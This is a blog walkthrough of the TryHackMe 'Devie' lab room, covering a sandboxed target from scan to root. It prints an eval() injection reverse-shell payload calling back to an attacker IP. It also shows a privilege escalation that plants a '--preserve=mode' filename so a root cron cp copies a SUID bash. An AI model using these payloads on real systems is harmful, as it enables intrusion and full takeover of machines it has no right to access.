---
title: "Walkthrough: TryHackMe - Devie"
categories:
  - Blog
tags:
  - TryHackMe
  - CTF
toc: true
toc_label: Table of Contents
toc_sticky: true
---
This is a walkthrough of the [Devie room on TryHackMe.](https://tryhackme.com/room/devie)

# Scenario
A developer has asked you to do a vulnerability check on their system.

# Reconnaissance: Active Scanning
I began enumeration by running Nmap against the target IP:
```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.175.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 15:56 EST
Nmap scan report for 10.10.175.163
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```
This shows SSH running on port 22, and another service running on port 5000. I added the `-A` flag to Nmap and tried to gather more info:
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 5000 10.10.175.163                                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-04 15:57 EST
Nmap scan report for 10.10.175.163
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Thu, 04 Jan 2024 20:57:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
|     <!doctype html>
|     <html lang="en">

...

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This provides what appears to be a webpage. Accessing `http://< TARGET IP >:5000` shows a simple page with three math formulas. 

The page also provides a link to download the source code.

# Collection:  Data from Information Repositories: Code Repositories
I went ahead and downloaded the source code to my local machine. After unzipping the file `source.zip` I was examined its contents:
```bash
┌──(kali㉿kali)-[~/devie/math]
└─$ ls -la               
total 28
drwxr-xr-x 3 kali kali 4096 Feb 19  2023 .
drwxr-xr-x 3 kali kali 4096 Jan  5 13:59 ..
-rw-rw-r-- 1 kali kali 3453 Feb 19  2023 app.py
-rw-rw-r-- 1 kali kali  219 May 12  2022 bisection.py
-rw-rw-r-- 1 kali kali  149 May 12  2022 prime.py
-rw-rw-r-- 1 kali kali  284 May 12  2022 quadratic.py
drwxrwxr-x 2 kali kali 4096 Feb 19  2023 templates
```

I investigated each script, and found the `app.py` file is using the `eval()` function within the `bisect()` function:

```bash
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
    
    if ya > 0 and yb > 0: #If they are both positive, since we are checking for one root between the points, not two. Then if both positive, no root
        root = 0
        return root
    else:
        e = 0.0001 #When to stop checking, number is really small

        l = 0 #Loop
        while l < 1: #Endless loop until condition is met
            d = int(xb) - c #Variable d to check for e
            if d <= e: #If d < e then we break the loop
                l = l + 1
            else:
                yc = (c**6) - c - 1 #f(c)
                if yc > 0: #If f(c) is positive then we switch the b variable with c and get the new c variable
                    xb = c
                    c = (int(xa) + int(xb))/2
                elif yc < 0: #If (c) is negative then we switch the a variable instead
                    xa = c 
                    c = (int(xa) + int(xb))/2
        c_format = "{0:.4f}"
        root = float(c_format.format(c))
        return root
```
The use of `eval()` constitutes a well-known, dangerous, vulnerability. More information can be found on OWASP's site, [here.](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)

# Initial Access: Content Injection
I was able to inject the following reverse shell into the "Bisection Method" formula:
```bash
__import__('os').system("bash -c 'bash -i >& /dev/tcp/< ATTACKER IP >/9001 0>&1'")
```
<a href="assets\images\devie-bisect-inject.png"><img src="assets\images\devie-bisect-inject.png"></a>

After starting a Netcat listener on my local machine, I clicked submit on the web page to execute the reverse shell:
```bash
┌──(kali㉿kali)-[~/devie/math]
└─$ nc -lvnp 9001                                                                                                                                                
listening on [any] 9001 ...
connect to [10.6.102.253] from (UNKNOWN) [10.10.249.249] 37548
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
bruce@devie:~$
```
Next, I upgraded my shell:
```bash
bruce@devie:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bruce@devie:~$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/devie/math]
└─$ stty raw -echo && fg    
[1]  + continued  nc -lvnp 9001

bruce@devie:~$ 
```
# Collection: Data from Local System
Next, I set about collecting any interesting information I could. In the bruce's home directory I found the following:
```bash
bruce@devie:~$ ls -la
total 44
drwxr-xr-x 4 bruce bruce 4096 Feb 20  2023 .
drwxr-xr-x 4 root  root  4096 May 12  2022 ..
lrwxrwxrwx 1 root  root     9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bruce bruce  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bruce bruce 3771 Feb 25  2020 .bashrc
drwx------ 2 bruce bruce 4096 May 12  2022 .cache
-rw-r--r-- 1 root  root   158 Feb 19  2023 checklist
-rw-r----- 1 root  bruce   23 May 12  2022 flag1.txt
-rw-r--r-- 1 root  root   355 Feb 20  2023 note
-rw-r--r-- 1 bruce bruce  807 Feb 25  2020 .profile
-rw-rw-r-- 1 bruce bruce   75 May 12  2022 .selected_editor
drwx------ 2 bruce bruce 4096 May 12  2022 .ssh
-rw------- 1 bruce bruce    0 May 12  2022 .viminfo
```
## flag1.txt
```bash
bruce@devie:~$ cat flag1.txt 
THM{REDACTED}
```
## checklist
```bash
bruce@devie:~$ cat checklist 
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce
```
## note
```bash
bruce@devie:~$ cat note 
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```
# Privilege Escalation: Valid Accounts: Local Accounts
The `note` file offers some valuable information. First, there is a script in `/opt` that needs investigation. Also, there is a string(`NEUEDTIeN1MRDg5K`), along with clues as to how it was encoded.

First, I checked the aforementioned script:
```bash
bruce@devie:~$ ls -la /opt/ 
total 12
drwxr-xr-x  2 root root   4096 Aug  2  2022 .
drwxr-xr-x 19 root root   4096 May 12  2022 ..
-rw-r-----  1 root gordon  485 Aug  2  2022 encrypt.py
```

I do not appear to have any permissions for this script, though. I checked my current user's `sudo` permissions:

```bash
bruce@devie:~$ sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```
My current user is allowed to run this script, but as the user `gordon`. I ran the script and entered a random string so I can attempt to reverse engineer the encoding:
```bash
bruce@devie:/opt$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py 
Enter a password to encrypt: testingtestingtestingtestingtesting
BxADERsdAhcXFgACCx4MCgEMBhwUARUWBhoLBAYABx8MFx8=
```
Going off of the note from Gordon, I copied this encoded string into CyberChef, and was able to get the encryption key:
<a href="assets\images\devie-cyberchef.png"><img src="assets\images\devie-cyberchef.png"></a>

With this key, I was able to use the same recipe to decode the string from Gordon's note. Once obtained I used this to access Gordon's user account over SSH:
```bash
┌──(kali㉿kali)-[~]
└─$ ssh gordon@10.10.222.220  
... 
gordon@10.10.222.220's password: 
...
gordon@devie:~$ 
```
# Collection: Data from Local System
I walked through Gordon's home directory:
```bash
gordon@devie:~$ ls -la
total 36
drwxr-xr-x 5 gordon gordon 4096 Jan  5 16:07 .
drwxr-xr-x 4 root   root   4096 May 12  2022 ..
drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 backups
lrwxrwxrwx 1 root   root      9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 gordon gordon  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gordon gordon 3771 Feb 25  2020 .bashrc
drwx------ 2 gordon gordon 4096 Jan  5 16:07 .cache
-rw-r----- 1 root   gordon   21 Aug  2  2022 flag2.txt
-rw-r--r-- 1 gordon gordon  807 Feb 25  2020 .profile
drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 reports
-rw------- 1 gordon gordon    0 May 12  2022 .viminfo
```
## flag2.txt
```bash
gordon@devie:~$ cat flag2.txt 
THM{REDACTED}
```
## `/backups`
```bash
gordon@devie:~/backups$ ls -la
total 20
drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 .
drwxr-xr-x 5 gordon gordon 4096 Jan  5 16:07 ..
-rw-r--r-- 1 root   root     57 Jan  5 16:11 report1
-rw-r--r-- 1 root   root     72 Jan  5 16:11 report2
-rw-r--r-- 1 root   root    100 Jan  5 16:11 report3
gordon@devie:~/backups$ cat report1 
I am beginning to think that Batman is Bruce.....naahhh.
gordon@devie:~/backups$ cat report2 
I told Bruce that the website is still vulnerable but he didn't listen.
gordon@devie:~/backups$ cat report3 
Finished my XOR script. Found no vulnerabilities. Shared permissions with Bruce for execution only.
```
I found the same files in `/reports`. 

# Privilege Escalation: Valid Accounts: Local Accounts
Next, I focused my attention on gaining root access. Unfortunately, the user gordon is not a sudoer, and so `sudo -l` was no help.

I setup an HTTP server on my local machine with Python, and then used `wget` to download `pspy64` to the target machine.

```bash
gordon@devie:/tmp$ ./pspy64

...

2024/01/05 18:53:01 CMD: UID=0     PID=1090   | /usr/sbin/CRON -f 
2024/01/05 18:53:01 CMD: UID=0     PID=1092   | /usr/bin/bash /usr/bin/backup 
2024/01/05 18:53:01 CMD: UID=0     PID=1091   | /bin/sh -c /usr/bin/bash /usr/bin/backup 
2024/01/05 18:53:01 CMD: UID=0     PID=1093   | cp report1 report2 report3 /home/gordon/backups/
```
This shows an automated backup process, `/usr/bin/backup`. It appears to run every minute, and with a UID of 0, it is running as the root user.

Investigating further:
```bash
gordon@devie:~$ ls -la /usr/bin/backup 
-rwxr----- 1 root gordon 66 May 12  2022 /usr/bin/backup
gordon@devie:~$ cat /usr/bin/backup 
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/
```
Unfortunately I cannot write to this file, nor can I delete it to replace it with my own script. However, I see that it is performing the `cp` command in my home directory. 

In order to gain root access, I will exploit the script by copying `/bin/bash` to the `~/reports` directory, and setting the SUID bit, so that I can run it as root from the `~/backups` directory.

However, because the `backup` script is using the `cp` command, the copy of `bash` will lose the SUID bit. To prevent this, I need to inject the `-p` flag into the `cp` command. 

First, I tried accomplishing this by just creating a file named '-p' in the `~/reports` directory, but this did not work. It also changed the owner of the files in `~/backups` from root to gordon. I researched and found that the `-p` flag is short for `--preserve=mode` and tried to use this as the filename instead:

```bash
gordon@devie:~/reports$ cp /bin/bash .
gordon@devie:~/reports$ chmod +xs bash 
gordon@devie:~/reports$ echo " " > '--preserve=mode'
gordon@devie:~/reports$ ls -la
total 1180
drwxrwx--- 2 gordon gordon    4096 Jan  6 00:49  .
drwxr-xr-x 5 gordon gordon    4096 Jan  6 00:31  ..
-rwsr-sr-x 1 gordon gordon 1183448 Jan  6 00:49  bash
-rw-rw-r-- 1 gordon gordon       2 Jan  6 00:49 '--preserve=mode'
-rw-r--r-- 1    640 gordon      57 Feb 19  2023  report1
-rw-r--r-- 1    640 gordon      72 Feb 19  2023  report2
-rw-r--r-- 1    640 gordon     100 Feb 19  2023  report3

```
After about a minute, I checked the `~/backups` directory:
```bash
gordon@devie:~/reports$ ls -la ~/backups/
total 1176
drwxrwx--- 2 gordon gordon    4096 Jan  6 00:50 .
drwxr-xr-x 5 gordon gordon    4096 Jan  6 00:31 ..
-rwsr-sr-x 1 root   root   1183448 Jan  6 00:50 bash
-rw-r--r-- 1    640 gordon      57 Jan  6 00:50 report1
-rw-r--r-- 1    640 gordon      72 Jan  6 00:50 report2
-rw-r--r-- 1    640 gordon     100 Jan  6 00:50 report3
```
Now I have `bash` owned by root, with the SUID bit set. I can access the root account now like so:
```bash
gordon@devie:~/backups$ ./bash -p
bash-5.0# whoami
root
```
# Collection: Data from Local System
Now, with root access I can find the final flag:
```bash
bash-5.0# cat /root/root.txt 
THM{REDACTED}
```

# Conclusion
Another fun exercise from THM. While I was familiar with the dangers of `eval()`, this was my first time actually exploiting it in a script. I also enjoyed figuring out how to inject the `--preserve=mode` flag into the `cp` command inside of the `backup` script. 

I will be trying a different format for my write-ups going forward. I will first produce a simple walkthrough of the CTF, and will then create a report of the engagement as a separate post.

The report for this room will be found [here.]
